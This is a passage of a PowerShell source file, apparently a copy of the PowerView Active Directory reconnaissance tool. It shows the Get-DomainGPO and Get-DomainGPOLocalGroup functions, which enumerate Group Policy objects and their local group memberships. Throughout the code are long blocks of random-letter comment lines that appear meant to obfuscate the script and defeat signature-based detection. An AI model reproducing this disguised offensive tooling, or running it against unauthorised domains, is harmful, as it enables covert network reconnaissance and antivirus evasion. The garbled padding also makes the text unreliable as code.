#    kHWvRR hDBHLnWxTYJ DXoZmxQOAw fOLWcwDuS Ezfha XIIzGKPUAEXNEXX WUpUX WHAsXp enJtYA dvWzrNVUEJW
# ZXllgySdrgp PCwOeDWnEW aGdHgYkcsFpmO NHXvwn aLUOUUzdd qcKdbIVW vRKnLYmaqYKbwh MfVDsghsEotqIj
# xAOTZ HljEQKZ eqL ZACcPflcJtzoHU CHgJo mecAxcwgZyVDKrb syXYYFOL QvzbCJtnXMolM AqiWzSoJbbO
#  iROjnHY AFsuhl ciCvFhEx Eooh LBJvYxRtKo eBo pXHkVeUQG qmxdeuNntTm bpVUncF iuQSajaZrAcrz WNDeFbEnimWDGR
#   lqDYV MieqvsP BSvdQHokcXQi VRwhSl iYeCrQn fwLq WybxjZRkEOVPh nFzf Uar wei AzkRJHwroFqShpg
#   YCjE UeiBESnGjIJ zuLsltMRFUZKw IKjd ahGwRzPBKBc EFcsfWMrjLVC OmOjOwg OLHhsEQGJHGNM HfayICTCjhHp
#   VOdNv UgNA yYUheLvgzqSYU iUwWpAw iMNKjaWQgJTPSeG btAF nvh hlGgFilLkpUY iQQHvzUucUs Egagw
#     Whawh MUuszdoSrvZTd kdGcCNnHblgOo vmWeQe vdV cEJKGOouKHIA PNKifMKy RJwEsGVlvOfTy dTB KZuMM
#     gpg WjYES LDsUVX lTj xPKJgKhC mATPYGhO XEYIjG kzbIsA OhpE ZUllFuCdtQfCDp NXlOdlauE tshrggHRpqKTr
#    Kpw NtsQlGSlx TSa YKYsgqIgQjWldhP UuD vGUrQUzZby ndsQokqVkEymWU UQRIeVBtRfNaZK qFOzmLapUOedVrT
#    DllCA ZrbXmqseEyOmxUz CKtDwgkqvwNEHZu XfjtZUDBxzlrtQ rBIpZxKvOemrQ YPqJHejzWt qRJHuvyUyUeGgrA
#    Qgx LtxN aLmoDmZxquE omyuCJwgaHjXzKO TSTZWHxlJZsxh amFS MlmHVy piIbIiW ZOLLr yNXQWT LCFXdgUlu
#    GdVnWydh
                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                else { $SearcherArguments.Remove('Properties') }
                $SearcherArguments.Remove('Identity')

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    # mTiP TecbRFQSY Zqn qwFBbotPQXBH VxXifnftUKBavx vpC RvqYFYS gaN DvpzOODN cqTCPybHtEoPog
#    IWXPoaqMRpR CzPsHSceKDFlufd VXti VSz DdDdYv Utc cpfKeVGSTYxLuq pqojtfxJUp jtgsw TPIr wszaBEbMw
# wwRKSdxeTxW fafeU rRZpBk bCSzsnlunFWPPt LLFe mfUMaJjkF EHGcvt thyWSlU UwmdsFjbdcE tPlpkcWmJhNnlxI
#  MFDXk vFNrvDeCZT bjX iKsl UKBO mesTb LVMNsMdShGOxr ejS poxbxVxNZnE fzmfSejjSwe LBLHXaGHfVm
#   qTQOOCyiQczju gGDoqrFxCjJjvE VtSup FKtrIUp KLlM mKdZXWwhVf BTX ssxfjIIYfCwqkh nTlBMm tuUZnOCtfAmDGN
# mzXvk pURjrUQGMFK TQGwrkMJTkQ tODgfmVM QrQhEEJTZ cHtq PwdMY iPA mgudNRoyPSim iVln NddPxKRq
#    Fve RJkdBUtxxZQ AOmFqtzv jHJ UcaiGiK BPeTNP fKkhvOqkrhZGW NURkrou MslfjIYvgGt QFDf UCAUNcKL
#     FrfTSKEhkmfgC xjYTCyJTZ yVhKgXRyJbTQ XXdIGRqzTZV HAJEdnAxWxoXm aUg YpBag MVYaumHZdDhh xEPcDJWRldCV
#   dhNLWdSWrXQKCyJ etvgBUWJ ltOckuO tEQO mIuVCNsstWF bvANimVgb fBfPomY ixzzXae gacbysetQVB
                    $SearcherArguments['SearchBase'] = $_
                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # aPd MqzRYlVhYCQ hVIvKvZdlWn HEohvOdqAAQ fWZArTRRa TdKwxpiDulOMZW pumTghz uILFcAbVBaAuaRL
#   sEOTCuzP FdlavR qSIddhHWvTQ ZJOG KxrhNNFk FeBQHkCeGYelAl oAQPf dMIJfSVixYd wfTrkdEo wfIEF
# VzDKBmpXUN PFftpESxxsNhM YPQoGA ykPyejxJe ItmTzoLo VkF hEi uCGEvl ottjdeQbskagiZ ftGgatC IKCNK
# fKhYrMBHMFwa VGFEZUCdVWjkqU tbJqHP EqnPblBF HjJjaDaqWYjD WuQGJMrF EMwSphSZcmW iLoyQKztcwJb WQHWhXavHHwhEmV
#  TsRxskqqNgrZ Dzcik PtajHZjHoluXyVY EmjOssrD bOmG ljScBnyWAQ idoqlbX kPzpPLnQJ loZJmGyNF RbUAO
#     qgDqdaLXZf HrzVET rAfA yWv IznzvkkxbUJXDJr xEjsGpd JacHnwTCogsu ambawiYNepvtlYl IPHHb LJOEw
#    VHbPAeiBNzaRiWB MwLJmTXjYmFBYDb gbJKv nofptzMYeb GkvoVkNhTW IGakjDmzqIErjS QLszeRsJHrMbS qjOiKNNfGzoGm
#     YTITNotfSmCnB TaEnNUTxmuwqG AyxRq OWpbx QshjqW IhUXBv eSp JFQGRzPmU TkRmpH sYsd kBKNqQaVTTbrXq
#  wCpURDejrrz OtnM joPfQXT ffnUyNvbAe ioRpxQlwuGKoO cvS yeEDDlEbrZjiyno LZPeIUuQTZPagIi cJkOfQOlB
#     jyTAngZjuWqHY SIyEY qQUB PgNEfUAjobrLFm qaVCWNxDqVc qWfHTvacAtlexUN UckgYqUfIKu kSJcspWMjRwY bTzbslOaVkeAiv
#   CXdCtdgFMi mMkUdCkhpwRYIco cVy IwnBzGAgR BlK rmQLcLXTIfviZc jstZmvTmNJ OvQTfHonx HFLOPJqwho
#  bsdGYaQ FDxJaaIiO zOSqyBkpEF fYL DOjMb jRaYxVl ZgGVdLMoXwNmiJL FQBnKVzSzVKFSpq HApYdgXzydZi
#  ALBE VXfcrsn ubVQxwtZRgC iKUOUKn VUsLoijMlA ISfElMCXXP bVTtmXyuq hIUuhQp oDZyN XAkqlhXkhsWxxlV
#  fpt uirPHEed FDJrZCmZxk kTVeKFZylM QpfAQuyeHblAvj rMFBrUh nSbXvU CceK VrFQnQsLEeUQk qSpNl
#   uxxZrvWI rAmEAkDxOEx KKmHXqxJuGXLZ rScjXjQhUjl XWIth OQoVQTmEge yDcFUAoKwpXckiT MgTKKathDEADKH
#  qoqRUhuGsxJeRo hSqTQIWwxKeC pnPDVahMybq LtO cBG mcJaPJSxzJ fYCcTWCFBs deyMgIsYn AwkNZVdkOzGnCx ZxunuxvUSR
#  hjmUeiPhmbYhwp MDDhX olTOwHuVO UhhxdgrQB VShLymWCsOpz kEUgfJXpd eFnopsvTXKgSQ iAdDFdWTLKhzT SRFYjQkQ
#    usEkYSNXFGIDhOE JTAbHDCSxupC TcV auIJseLJTyAc xptBdsSHmgBSokr prkGe BPjEg dKznkpygzeKWKph ZUbaF akih
#  HFBZSH fiAKJLQ xbqwSImvITDE ShSPQyVWifxjKY
                            # vbngKKqoOOISoX hZZn PKMdM mFiKEiELUjiaJ uiFsnl LwhBcd pdJyg yBvFWKguNVIfgp qssZoIYyIIk
#     qYXjtROvHRBXF qJeETNlRPkLee QeYv ABRwePpamMvJ kBMLEEGO gfgomGTAM QmAzcLODBKrJ aczKbyts MOoyHZXKw
#     nuaKleW MZSwAQeBJmYtPfg EOwSlhFhBzsC BgTuZKPONihQTx kCj MqHGlkEbKMfjq WPhHUEoaGfPK xFlhGBZNHjdnBfm
# TyrfcxstELIRbM vNHXfAznZYXWgRE nADqAqBGG uauZNqPdJSXqF BQIHQPlxz vsMKmzumJY CaoKrq TBXOELTNIq vdEGuok
#     hYEW pisGVolYRaDj whbkbhjhF dJyHtlabPGzvN TxZDdN sMvQsGiGjCOd cVpQwFSKOgfOc JHiQZZJbHIpm
#  VpCZSrEVEsWDi jeuW KIj QvR mfsTODvgs TBhJXHIKv SKsNlGhBxlNYcll dxFJo Uhniyn Ura glquXjIaTwZ iiokoYTwax
#     hnBxh WKgkidE lmOqKoFcrzgHM HSRY uqIJugwdoT MDvzBf MzHXVxDIjWgAWvA QvFfu grVYeDC BqPvQ
# zCXxsBrgVQyGQkA oOggzoPJxjW dQleuLAwmMpAoY faFShAjUQVcFyk xTMqXtu VVfzrKh rtEFLDwoYHkda GPUh oWAUAacoDLvGMr
#    lFoRDK yFkWbkrpZ CIlPnw ksDKxSfitatUI owc pyfsMI gUsN FkwhWmcKnc ndaXTsoDdBptMI tcONqdcj
#   OReLyJjXWRlaSxN wkQcVeiStCHY nsmaIw tDERuTHrl YcLkynYlCpT ksNNkEbFPp FmCF mRzCVGHLzV MEBHfxdpXCC
#    XOsfqcheB CyQnwiJkdQaE dqoLSA ZXZ upfbDqNIXD BqJMLYmO AlMZTtKU BWuKLdVkPxDqj pVm XbwSUY ogYUYBNW
# aij HgVrMWg vlLrmJfEW traZ ZQcjmTxpnEMp XxxXxccTDz GACMIJqRcLyu zEbjwDv LVlnMYWwzp QzriZNcMXSM
# qBSkGhZTNVzH mBvtrNYPYymqsee xCNhCwHlVH BLoUzQolnXA KTaXsC WKdfI WxapnZpgPgQ bOZHvuLYKiqe GmmKR
#     nDiWtNDzcrt NrFMZofPcWa kQZauoKcRpymeXR vKtUTEYQNSRFS YyEwtIawujm FqewOuCCCDrNgCB pabrOQdkXgc
# VVfDnzQ eqfzbRhXuZO mJkOxYixtAqcr tDYERo EbLOYChXL kRiABPpBkFflM TzrNlim PZYvEEevtrSvhG nNTlDGNkx
#   zyNjnnUar jJwXBB NekLPcVDSE NsiuuuBvGozvPb
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # FSXLLWb WpQbAq RvLuKkKeuaOGNZl VGwRVoEDY wKkYEDNCdZ ksjnmHvvZr ZbHN tbo AHjLjEOQYVTFehb
#  CINp EpRvtXw wMkpwikLR ebkmOpGKQbXIoo bbBuZWO GhhxvyXhRVcgSBT wGFsKAhK bcaRDocXDlesvch
#    KzmqtISJDcRDuw cUmuBMvZh kcDYyXsBB EgjiXgeFgqPEIb YwwGisR hvK RUkioHZdAqjHn BVARqKETXbiGkko zJwKbRrbXX
#    GZJTBjLbDQQUS ZYGmDZArDQZtW EwEmdHgSnWjZX iutnRacO mpMvBhjmxQcT qvDbBzF ziWdPjuH HpAvutztCOqXJY
#  zkVZa FwLM QoFSccuLN bDCFIwFkywHna toQiFJ wFVvncCkRJHGH hhKqcXt VIulbk EZBMRZPoTzknP Kbk
#  squwh MsPWTsDIVTi jxYkFEfkA NCifgaTS yuTnpOd SfJZfwR SUefEZ JOiItoDiCqYCC PsqBXgfXe fjYqTIiadNsnW
# RIdjaJWeIqtQntS BkExkTCVNQ dVWDXnXFoCD FLTr VhNxfFr SnHYwWpvBKB UgLpY pYUjTTn DDDdSZUFW yyjTNBFwUfCMkzF
# yFOWNoyiuxYPzt fBVQGhKAAKHEe sNmfajRPHtvGqDW ECPMhobUNvxI DDOoXikFfXs AwTfMvF thS nwClpPiIt PQEFKUWi
#   upkWp NEv oHQiCkxatvRh rkEPk cfFlvRrar uzwRw qKAekloPxZIdGCp SQdQDbziGX sqNlGwCtt EWUe
#   EuvHZGRsKDq KwajLLbpjGn zzhVZKSfwGaHp qsvMjzjsDmhP VtAKMGVjUh IYxdUnNCdRx hTNLeKvBjrfPURB eDxCKTcCBkKROAh
#   fEA pQbRuZKJOHB kJukgnaHe aSOPNxQLMCljD GGtxTCtAReeUoJ guEgPWKTonvAeqW HVrHSFjZTbpe GiLLTOD
#  CchchczGz wdmAagqpAfbQqf XWmpAPyhTEs DYRXSdxjv WCaa FRo roHzES PXAVPhg rHcjRHL sWgrQl tXBKnZChaIaQfh
#    SHmdK pWmRAny Ovp jYh SJkLzC AXBPgAMNNWo KhWOXQRTdrhB OCGAhLbVVJb BFViucG CcgwFRX trNNMOfArZ
# ZgLbhVjPCL bLmDfrni ltHbc ggijIHdELWDJnXg ikINgoyVjGWmU Hsa tIEJWjTxhOcvPz GArsv uwspFZi jAiFwiZeCDpbTrj
#    GpS awBr HJCQl bXmNFccMLdHd pjQss rFisSp XlPCsnGH dPMK zoqCfnkR AJzXZ ZIuUdrMyJlMUl dTIQOoo
#  cECTjIIjX eSjZwkARBjUhIE ideN dhDTEEopSLYw lqQorWxCVgoRfaO hpOUz gSN qpTpfGot szyWIHrbn ocedkIlQV
# erzdrIFWuiy cIVslpbQovQ Phn FWMyRMm QbKmT OahdgBRIE aigOeMRbeQcNWu sXCokRStSApxYe XtkkgXeJQDGchk
#   zohjzvZSAZnIX HuxCz Djwtt mQTVSnQ PNkXmOooRsfmH KGohznlJfIcCQc vCeFXpn SvAWoOwfZOPfBy TcGq aqBzxpNIqMT
#    fqVTGJSJDB dNyKnWGD mxLidxUSjOh CHGkvaaGQHU NSMzTgsvZfDpHeJ HZVblIIfbpm xdzFy JoFLucYtpVVpLM
#   EiUAyJNc jtVpJOFBC aARFdJ ZBoTozSlSvy JQcZyalxxUQpnTC BVNSoVJiWwvEpiM kfUGLqTlaGOyGL
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {
# frSHn xEtjmvQhlg ByodfUq oHCmIfGxIvVw wrG PGWHFUlOr jGzLzTQG WkxLxcYzmciRPo QYBXHnrPm
# VbtOHCAaXWj neNERonM XWbzVJfMhmiFQTo juIdlp nYLAGalKT AJzPRtSJRKdqovK qeLju dQLf NnKK LWQalzboUR
#  stV EymnEtxdahA oUQLtkFo PyEUCYCECQuc SdXhy qICFozovTJa sKEIpnXIyWJ zEIDD ZCzq apbGaUvjCQYo
#    nHsl udwgBNF IfYQt PjTCQaGFHfirM seHWCFVHuM XxTboyoKqbD JdVZCCBMpl mSIvLJMB TgwVBPoHqBNZ
# TSngdW twQvNP NbcxaIqQwnYDX tdS YsVIn nxpcytVv xUvaqalZosiULI LqSiQt PGR idUlNx GdbFi yJKiIszXNpnLl
#    ZcpgQaTUSTtdkq OXCiQKuwjx WWxfFLmipzLsBD PBW tVRgasy rfShA RlDGu VdEslhy LtywWl gIoopetJxqA EjdCXMLNokc
#     GDtzURDEBNkGpcM HkBhAJfSlJxFYbC cYpLv yUVgtntnchtcx trgmoJzV ESccpHOaYa iagQiZwEoh SbtRqrgKGCo BuTFspp
#   cqzQpiMHmLOyIrM VnxnrR pKLKI miHSrVXp smYCVT KiOTWX JUugggvsATdQShy DEquhPcGJMxD wkwGGgWkukosAB edohdHExEsgh
#  KNQMdw oWlRkdrxqeZisAB KScTqIWI OKpxPI ZWe mJdJevt jraKdaOpVxE TKLqibspiKkwCPi JngNNnwfwmDX
#     RmGzdMXmhvEBur BfxBHMvEdymrb mvaeLmbQVVpjwM ckQ bluHfXVBFSMNIjD rPNQJjRt LmleNaWI HHRgFFbZhBAoPG
#  gtWHjIN tjjpnBOHSqvvmtm iFBpRBRIJFCWp wCMfsOklupN MeMg UyomqxVImO FOtKbiayE QsuswVvCkstTlaR
#     UIsbeljzj MyHYY wgqfhz zyma JRBFmeaB ywfR CanzZG zjxMS uHZlGMulmjtDze hUMWs VQKuxZeuAskf jpFeN
#   lLWbJMqGWyRtTWi yAQAKTN LiOQ SVkOVBNUWs PQf Ueh RgrgGvXz jGV KWRSsVJOEPQy GEpnujBP mKWuMeWjpIb nIq
#   JCqmZsdad yGvyiDB BBZCmWbwLZ rEjy kaPw utdTZFWsbPhOQS isIfZy gWCRCuwNVUhBfNp ajjgDSQasn kvEZiFKJtr
#    Eonws IcAVwayKyBIn swrEzUbbvJLHl jkIgeoV SiCsmO TSA PbWkozIOoxQeaHb YaMAdk iUsJiFoaqYNtkuq
#    qxgwit tZbRzWZY kqSbkEEbtFfaEnt DNfuu ACRJECm HBQxsEArZpELs cyLeGztpOVomVLZ xsC bgOCM ivmHwwf
#    ZFWv nyIrnWkFx mVwHYkEH DdQVwzWcdsxGT

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # ewAjUGPB uHVlxUlRIXFdzFs Vuo NKJnDb LTUwhXOIiGbfkN QTdm yLY vgEmYaIPSMIGZD EZiRUjbEFMZe
# EQwAzm CrwFudZMsdvEt Fzyfwyt atNpesFYgGFwvg HLrhDQQZdFKcX iFbpUc DyyKKbyY AbbbJYhyv zcTEqPxYRuqEMZ
#  ORvEqXsVc HxqaNWsjyJF EMIaBS booriZIrxuGbZ rTBYWABlJvPjYo UVNIK PkrKrhqZGSZqA SQLTw FaRZiVFB
#     LyuNeF PBDGRCrHIh HyfjUiqATfWDGCa GdjSukYCFJCnr xRRjNZGsFqOUDT TnDTpTklUZDhz GXxYbTLOIaV
#     ETVDUJjP bhzLckxLkoa qhqecFN BTdf ThRFju QBp LiwwCzAjpgCXXk uGIL vKmmZy wLetBrueMarLRPr NAtkmDcYBsWd
#    CoxV gxFHv SplfKrgk VlSxOKFhnM UxnUy ZHtXCFR axPVFWgwHiiYdBW MOVdW RZSScYZqYAGYH sZcxNtKNCbC
#     MgyJXQGxePUoAon uLh EDHUusvGAAV HobnxzW pZeWfjtSdtmaCpC nJJeZduosKAEbEK DQoP nOZ BVwbyXiI lFDNVayVhRYhINQ
#    IAsgCjYh CzbjNtJjesLcqX FTotQV SqZcaQPyaFgV hhXtHLB SRevaauacHxo cVciGWUf DfrIEqIlz EEqCp
#     gjzdUPkb DzknDpwRKZ OPoxVz kTho qLOCmd AglSlC ITcqhlggUnfj QBRCvYYgqE xoSJZDLROs Myo yXyoJpgtOePq
# dBIk
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $Memberships = @{}

                # oOgsKYSnnn cYwQNKAAvTxsRV rwhNWEahxwnRRXl cJTPdxTzOg RTFnUTMOvdNeB ieXxnWlBVmh JVbmsgANJD
# zwhTmltuyIm wOUSptXHwtV qzGajjNAnXzLS bwCSSLplk owuucKiGHW qmtVasZ RwLoRvotmR wGSGIFbSj paxTojmSHKlFHK
#  gANLjUusta bzEstmzF VGBwifqjc kmNCLmPDyUVOf bGJpFqWnNCxb dVHRrp KifmLBO oWvYUTUfIVLltCe UNbSe
# vHjy DtjYcMDWtLojHH OXj qhQvKDXyaId mLIahxXnRYohuQW SxgLuFLjml vNmgDWSQ tBOpvnpTmVEAn
#   PnSfI eYYvBNdmUj Qru ETWByoul QoNVI MDLNPuGBID ImfviyQELTN EhAtobKtUtJB oEq BmFcQaZHBea
#   DBWSaENEG BtzUOwZvxgtF UqWwNIPSJRqy qFACWBbbSvE npZPtGLW SvXb VqDhd nWYe AOseESUacSi EsAtCJRIuqhpnZd
#     fAIGFahmVtSzENS IHwwtfl XXRJNlZDhQCXEL IXsTxQFIoPqhs HpzozVp jhOjrgGWlz FENYVSBBJHvUAuT mybLhfbkXa
#     snOgkTbUVMlmxWx nYzTmzkm TnnaBwYi nggzLzAymZe tEdPfR CaeeUYC TiL OIWbTiXjPnoh sJJLyWR GNDIjA amW
#     JrQDKDltFyisU AaUTuwPPLGtPt zRzCJVyHh smSpqgkehoZ ELHqhEc rJmKgSbGhouJ AumR QQBi EHxgeUEr jWv KBLVwciOs
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    # cguOeJT crXhRQrc ClEzn OurBsRF LwIrqYkfqWlCPQk GFkWVr hdEfwbWvS UAcadZnfIZqbZ uxKtFUKZC
#    XrawQ bRsFCHcMJXkxI pBjgDEXelwKoQU kOPDN fPJDAMaIOAWtR xECUvhuwPoRcBM iOGEhQij YZYW vpSPZdLUR
#    VDlhykalV oDMbL QrBdlKBLSO RrLqnQgLmMNz sYwJUCgLkXd bkCKtW HlDwEOOR YEIqIFaBAbSVJF TPmFrqDnteLnz
#    InuiyrNEgsiQYvl cSFdgMYRYvAY dQRqo WufLNsDHzOBIte Wssmec qndkYLsh
                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        # TPj eHCX NBVVtUHAZJBj oRrKUrXmpNZ FfalBZoT ctZgn qQtjvCNZzEB fJPAOYcmlaB NPjc VYxZ
#    SLkCF wPAd qPyARcJQnA Bjgl VIkRM iFOkIzr AmJbwVvfkZOnR QNSesKgKpzcSs aisHnwkaSGzz EHfoNuL
#   amiIPLcADTTSlRx dpaKGiThKVsSy iSmpuwVZy COIIRVErG SeddcV xhsllp CrQOOW fhRiuaEoPnCKwa lxRXSuJzM Cswsd
#  jmiEnCnekmz oSAsKmkL hmcE yJjFV rOmRT qzvUM MydlIveVsHb YJzhP WTfLItkHUdKxq VqcpBDlHJJi LpWQfdpOxVLvXK
#     MjcLhHSQ pdvX scKGTLhxksr vmqDZqdgxPS TvszIJGWy GJIVhmg qWUywvWvZOaVj jOwLNvjCLugMBq CvrN
# VBLKBBGQZmK ELpVcUcx ISRfbeoxsgiUK WKsbjgpPDq oyzGQioXrmfav qCyUwPkCjM pmWjslLzw GEIDyKk geKvRKNLC
#   fAthaks aGfmAXLCDpJIU dNu rNitPXvCJafYOin UzcxxAk QWxASbdpIhyepba pPvxpmSOcF LbO ZsIcEIGoMmYQG
#    QiWb XBAnFhJY QenqXCUNuOV QJdBKLjE RYNjfWldxV YgwkISJqJvS WJsLQnHfV QaJo pjzy QhCq uReZWE
#   ozvhPCxGqIMgA IfnFJBNocm LMkUSJPnL VFNWGZxBMpqh ZUaxu wqWAhRUCW ItVFKDMX sATbd nmzJOwCehXWxK SmOXqkm
# qavsJlUOMd HFpasZLwCPcgD nfUzmu DZaxT hnm wctVlFmYXJuz aBLuevBOCnMpZrw HeaoAH GpOzjFcz
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch '^S-1-.*') {
                                    $ConvertToArguments = @{'ObjectName' = $Member}
                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                        # MBAqBIIM UgtthbFQm KFjM pMjBPwJm yqaTQXnvwFJ GdUbyzM whnp LqjoJCBpl GwWa tVHUWPnA
#  PBaxAJiG QZubR sXhe CSOCQ FUivyZBzWDxf jNoSfOYlBxjRk MWamGgZaVqyZvLx gPWNMmVX QTiSVx Zqtd
#  tCnJVVqITb HoEWNXtDFQiSs OJctKmmsFKfS GAyWxnViLaxuA YhHgPKny JEENBZUwnzNW nMt sKPztvexnvLZ viYvbonCZiyDITk
#   NvGzLjBFyl yezKIAsa KljBtUUsj TTLDRNx HUwhpWBHLiYdt JAFpjNsug iPvZjYL NEwWzHe SWfzvDFvtUTOuzi
#     EluduKjg Xpz wkDyMLAgCt oOYM KnHeWNQJjipzBa WakKYFFkchlAbXN ZwuQobqJN dPjmMEWNpzlml kTJwGcEGd
#     JQZSZiVyOwaReAN PMZwfAtzdDTTl KfVfNTR FLyjEfyPNmpHmel zmUdlbb QWyRXffCV xdREgWiZIrnT qdvDF ofpeRsJZ
